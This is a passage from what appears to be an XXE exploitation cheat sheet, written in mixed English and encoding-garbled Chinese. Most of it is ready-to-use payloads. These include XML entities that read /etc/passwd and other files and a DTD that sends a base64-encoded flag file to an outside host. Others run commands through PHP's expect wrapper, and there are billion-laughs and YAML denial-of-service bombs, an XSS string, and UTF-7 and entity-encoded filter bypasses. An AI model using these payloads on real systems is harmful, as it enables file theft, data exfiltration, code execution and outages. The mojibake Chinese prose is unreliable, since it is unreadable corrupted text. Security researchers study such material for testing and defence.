<li>å®ƒå‘å‡º HTTP è¯·æ±‚ä»¥åŠ è½½ zip å­˜æ¡£ã€‚ <code>https://download.host.com/myarchive.zip</code></li>
<li>å®ƒå°† HTTP å“åº”ä¿å­˜åˆ°ä¸€ä¸ªä¸´æ—¶ä½ç½®ã€‚ <code>/tmp/...</code></li>
<li>å®ƒæå–æ¡£æ¡ˆã€‚</li>
<li>å®ƒè¯»å–<code>file.zip</code></li>
<li>å®ƒåˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</li>
</ol>
<p>è¯·æ³¨æ„ï¼Œå¯ä»¥åœ¨ç¬¬äºŒæ­¥ä¸­åœæ­¢æµç¨‹ã€‚è¯€çªæ˜¯åœ¨æä¾›æ–‡ä»¶æ—¶æ°¸è¿œä¸è¦å…³é—­è¿æ¥ã€‚ <a target="_blank" rel="noopener" href="https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution">è¿™ä¸ªå·¥å…·å¾ˆæœ‰ç”¨</a>ï¼šä¸€ä¸ªåœ¨python<code>slow_http_server.py</code>å’Œä¸€ä¸ªåœ¨java<code>slowserverã€‚ç½å­</code>ã€‚</p>
<p>ä¸€æ—¦æœåŠ¡å™¨ä¸‹è½½äº†ä½ çš„æ–‡ä»¶ï¼Œä½ éœ€è¦é€šè¿‡æµè§ˆä¸´æ—¶ç›®å½•æ¥æ‰¾åˆ°å®ƒçš„ä½ç½®ã€‚ç”±äºæ˜¯éšæœºçš„ï¼Œå› æ­¤æ— æ³•æå‰é¢„æµ‹æ–‡ä»¶è·¯å¾„ã€‚<br><img src="https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png" alt="Jar"></p>
<p>hint style&#x3D;â€dangerâ€<br>åœ¨ä¸´æ—¶ç›®å½•ä¸­å†™å…¥æ–‡ä»¶æœ‰åŠ©äº<strong>å‡çº§å¦ä¸€ä¸ªæ¶‰åŠè·¯å¾„éå†çš„æ¼æ´</strong>ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶åŒ…å«ã€æ¨¡æ¿æ³¨å…¥ã€XSLT RCEã€ååºåˆ—åŒ–ç­‰ï¼‰ã€‚<br>endhint </p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><h4 id="Billion-Laugh-Attack"><a href="#Billion-Laugh-Attack" class="headerlink" title="Billion Laugh Attack"></a>Billion Laugh Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Yaml-Attack"><a href="#Yaml-Attack" class="headerlink" title="Yaml Attack"></a>Yaml Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a: &amp;a [&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;]</span><br><span class="line">b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]</span><br><span class="line">c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]</span><br><span class="line">d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]</span><br><span class="line">e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]</span><br><span class="line">f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]</span><br><span class="line">g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]</span><br><span class="line">h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]</span><br><span class="line">i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]</span><br></pre></td></tr></table></figure>

<h4 id="äºŒæ¬¡çˆ†ç‚¸æ”»å‡»"><a href="#äºŒæ¬¡çˆ†ç‚¸æ”»å‡»" class="headerlink" title="äºŒæ¬¡çˆ†ç‚¸æ”»å‡»"></a>äºŒæ¬¡çˆ†ç‚¸æ”»å‡»</h4><p><img src="/../.gitbook/assets/image%20(531).png"></p>
<h2 id="Hidden-XXE-Surfaces"><a href="#Hidden-XXE-Surfaces" class="headerlink" title="Hidden XXE Surfaces"></a>Hidden XXE Surfaces</h2><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>ä¸€äº›åº”ç”¨ç¨‹åº<strong>æ¥æ”¶å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œåœ¨æœåŠ¡å™¨ç«¯å°†å…¶åµŒå…¥åˆ° XML æ–‡æ¡£ä¸­ï¼Œç„¶åè§£ææ–‡æ¡£</strong>ã€‚å½“å®¢æˆ·ç«¯æäº¤çš„æ•°æ®è¢«æ”¾å…¥ä¸€ä¸ª<strong>åç«¯ SOAP è¯·æ±‚</strong>ï¼Œç„¶åç”±åç«¯ SOAP æœåŠ¡å¤„ç†æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•æ‰§è¡Œç»å…¸çš„ XXE æ”»å‡»ï¼Œå› ä¸º<strong>æ‚¨æ— æ³•æ§åˆ¶æ•´ä¸ª XML</strong>æ–‡æ¡£ï¼Œå› æ­¤æ— æ³•å®šä¹‰æˆ–ä¿®æ”¹ <code>DOCTYPE</code> å…ƒç´ ã€‚ä½†æ˜¯ï¼Œæ‚¨ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨ <code>XInclude</code> ä»£æ›¿ã€‚ <code>XInclude</code> æ˜¯ XML è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸ä»å­æ–‡æ¡£æ„å»º XML æ–‡æ¡£ã€‚æ‚¨å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­çš„ä»»ä½•æ•°æ®å€¼ä¸­æ”¾ç½®â€œXIncludeâ€æ”»å‡»ï¼Œå› æ­¤å¯ä»¥åœ¨æ‚¨ä»…æ§åˆ¶æ”¾ç½®åœ¨æœåŠ¡å™¨ç«¯ XML æ–‡æ¡£ä¸­çš„å•ä¸ªæ•°æ®é¡¹çš„æƒ…å†µä¸‹æ‰§è¡Œæ”»å‡»ã€‚<br>è¦æ‰§è¡Œ <code>XInclude</code> æ”»å‡»ï¼Œæ‚¨éœ€è¦å¼•ç”¨ <code>XInclude</code> å‘½åç©ºé—´å¹¶æä¾›æ‚¨å¸Œæœ›åŒ…å«çš„æ–‡ä»¶çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">productId=&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1</span><br></pre></td></tr></table></figure>

<h3 id="SVG-File-Upload"><a href="#SVG-File-Upload" class="headerlink" title="SVG - File Upload"></a>SVG - File Upload</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>ä¸€äº›åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œå¤„ç†ã€‚ä¸€äº›å¸¸è§çš„æ–‡ä»¶æ ¼å¼ä½¿ç”¨ XML æˆ–åŒ…å« XML å­ç»„ä»¶ã€‚åŸºäº XML çš„æ ¼å¼çš„ç¤ºä¾‹æœ‰ DOCX ç­‰åŠå…¬æ–‡æ¡£æ ¼å¼å’Œ SVG ç­‰å›¾åƒæ ¼å¼ã€‚<br>ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·<strong>ä¸Šä¼ å›¾åƒ</strong>ï¼Œå¹¶åœ¨ä¸Šä¼ ååœ¨æœåŠ¡å™¨ä¸Šå¤„ç†æˆ–éªŒè¯è¿™äº›å›¾åƒã€‚å³ä½¿åº”ç”¨ç¨‹åºå¸Œæœ›æ¥æ”¶åƒ PNG æˆ– JPEG è¿™æ ·çš„æ ¼å¼ï¼Œ<strong>æ­£åœ¨ä½¿ç”¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒ SVG å›¾åƒ</strong>ã€‚ç”±äº SVG æ ¼å¼ä½¿ç”¨ XMLï¼Œæ”»å‡»è€…å¯ä»¥æäº¤æ¶æ„ SVG å›¾åƒï¼Œä»è€Œè¾¾åˆ° XXE æ¼æ´çš„éšè—æ”»å‡»é¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>You could also try to <strong>execute commands</strong> using the PHP â€œexpectâ€ wrapper:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;</span><br><span class="line">    &lt;image xlink:href=&quot;expect://ls&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„è¯»å–æ–‡ä»¶æˆ–æ‰§è¡Œç»“æœçš„ç¬¬ä¸€è¡Œå°†å‡ºç°åœ¨åˆ›å»ºçš„å›¾åƒå†…ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿè®¿é—® SVG åˆ›å»ºçš„å›¾åƒã€‚</strong></p>
<h3 id="PDF-File-upload"><a href="#PDF-File-upload" class="headerlink" title="PDF - File upload"></a><strong>PDF - File upload</strong></h3><p>Read the following post to <strong>learn how to exploit a XXE uploading a PDF</strong> file:</p>
<p>content-ref url&#x3D;â€file-upload&#x2F;pdf-upload-xxe-and-cors-bypass.mdâ€<br><a href="file-upload/pdf-upload-xxe-and-cors-bypass.md">pdf-upload-xxe-and-cors-bypass.md</a><br>endcontent-ref </p>
<h3 id="Content-Type-From-x-www-urlencoded-to-XML"><a href="#Content-Type-From-x-www-urlencoded-to-XML" class="headerlink" title="Content-Type: From x-www-urlencoded to XML"></a>Content-Type: From x-www-urlencoded to XML</h3><p>å¦‚æœ POST è¯·æ±‚æ¥å— XML æ ¼å¼çš„æ•°æ®ï¼Œæ‚¨å¯ä»¥å°è¯•åœ¨è¯¥è¯·æ±‚ä¸­åˆ©ç”¨ XXEã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>

<p>Then you might be able submit the following request, with the same result:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Content-Type-From-JSON-to-XEE"><a href="#Content-Type-From-JSON-to-XEE" class="headerlink" title="Content-Type: From JSON to XEE"></a>Content-Type: From JSON to XEE</h3><p>To change the request you could use a Burp Extension named â€œ<strong>Content Type Converter</strong>â€œ. <a target="_blank" rel="noopener" href="https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html">Here</a> you can find this example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;root&quot;: &#123;&quot;root&quot;: &#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;Avinash&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">  &quot;country&quot;: &quot;United States&quot;,</span><br><span class="line">  &quot;city&quot;: &quot;ddd&quot;,</span><br><span class="line">  &quot;postalCode&quot;: &quot;ddd&quot;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127:8000/TEST.ext&quot; &gt;]&gt; </span><br><span class="line">&lt;root&gt;</span><br><span class="line"> &lt;root&gt;</span><br><span class="line">  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;</span><br><span class="line">  &lt;lastName/&gt;</span><br><span class="line">  &lt;country&gt;United States&lt;/country&gt;</span><br><span class="line">  &lt;city&gt;ddd&lt;/city&gt;</span><br><span class="line">  &lt;postalCode&gt;ddd&lt;/postalCode&gt;</span><br><span class="line"> &lt;/root&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>Another example can be found <a target="_blank" rel="noopener" href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">here</a>.</p>
<h2 id="WAF-amp-Protections-Bypasses"><a href="#WAF-amp-Protections-Bypasses" class="headerlink" title="WAF &amp; Protections Bypasses"></a>WAF &amp; Protections Bypasses</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</span><br></pre></td></tr></table></figure>

<p>This only work if the XML server accepts the <code>data://</code> protocol.</p>
<h3 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h3><p>You can use the [<strong>â€œEncode Recipe</strong>â€œ of cyberchef here ]([<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7">https://gchq.github.io/CyberChef/#recipe=Encode_text%28â€™UTF-7</a> %2865000%29â€™%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to">https://gchq.github.io/CyberChef/#recipe=Encode_text%28â€™UTF-7 %2865000%29â€™%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to</a>) transform to UTF-7.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;</span><br><span class="line">+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure>

<h3 id="File-x2F-Protocol-Bypass"><a href="#File-x2F-Protocol-Bypass" class="headerlink" title="File:&#x2F; Protocol Bypass"></a>File:&#x2F; Protocol Bypass</h3><p>If the web is using PHP, instead of using <code>file:/</code> you can use <strong>php wrappers</strong><code>php://filter/convert.base64-encode/resource=</code> to <strong>access internal files</strong>.</p>
<p>If the web is using Java you may check the <a href="xxe-xee-xml-external-entity.md#jar-protocol"><strong>jar: protocol</strong></a>.</p>
<h3 id="HTML-Entities"><a href="#HTML-Entities" class="headerlink" title="HTML Entities"></a>HTML Entities</h3><p>Trick from <a target="_blank" rel="noopener" href="https://github.com/Ambrotd/XXE-Notes"><strong>https://github.com/Ambrotd/XXE-Notes</strong></a><br>You can create an <strong>entity inside an entity</strong> encoding it with <strong>html entities</strong> and then call it to <strong>load a dtd</strong>.<br>Note that the <strong>HTML Entities</strong> used needs to be <strong>numeric</strong> (like [in this example](<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C">https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,â€™Numeric entitiesâ€™%29&amp;input&#x3D;PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\</a>).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a &quot;&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x6F;&amp;#x75;&amp;#x72;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3E;&quot; &gt;%a;%dtd;]&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;env&gt;&amp;exfil;&lt;/env&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>DTD example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % abt &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://172.17.0.1:7878/bypass.xml?%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%abt;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>

<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><h3 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h3><p><strong>Extract</strong> <em><strong>index.php</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Extract-external-resource"><a href="#Extract-external-resource" class="headerlink" title="Extract external resource"></a><strong>Extract external resource</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://10.0.0.3&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Remote-code-execution"><a href="#Remote-code-execution" class="headerlink" title="Remote code execution"></a>Remote code execution</h3><p><strong>If PHP â€œexpectâ€ module is loaded</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SOAP-XEE"><a href="#SOAP-XEE" class="headerlink" title="SOAP - XEE"></a><strong>SOAP - XEE</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XLIFF-XXE"><a href="#XLIFF-XXE" class="headerlink" title="XLIFF - XXE"></a>XLIFF - XXE</h2><p>This section was taken from <a target="_blank" rel="noopener" href="https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe">https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe</a><br>According to the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/XLIFF">Wikipedia</a>:</p>
<blockquote>
<p>XLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.</p>
</blockquote>
<h3 id="Blind-request"><a href="#Blind-request" class="headerlink" title="Blind request"></a>Blind request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://redacted.burpcollaborator.net/?xxe_test&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>The server response with an error:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed.&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>But we got a hit on Burp Collaborator.</p>
